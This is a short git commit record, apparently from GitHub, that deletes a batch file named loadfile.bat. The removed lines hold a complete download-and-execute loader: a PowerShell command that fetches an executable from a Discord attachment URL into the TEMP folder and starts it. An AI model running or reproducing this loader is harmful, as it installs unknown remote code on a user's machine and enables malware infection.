68def3924bdcfe3a59d8e2ad700512cdd5a98d65
memberRemember <94972595+memberRemember@users.noreply.github.com>
2024-05-18 20:27:31 +0300

    Delete loadfile.bat

--- loadfile.bat
+++
@@ -1,3 +0,0 @@
-powershell -c (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1239366779504164935/1239366912643829780/main.exe?ex=6642a9e2&is=66415862&hm=50cdee8e6e521e0d855ee428185efa3f26772e50e4d1826a2e45ecea04574398&', "$env:TEMP\main.exe")
-Start-Process "$env:TEMP\main.exe"
-exit
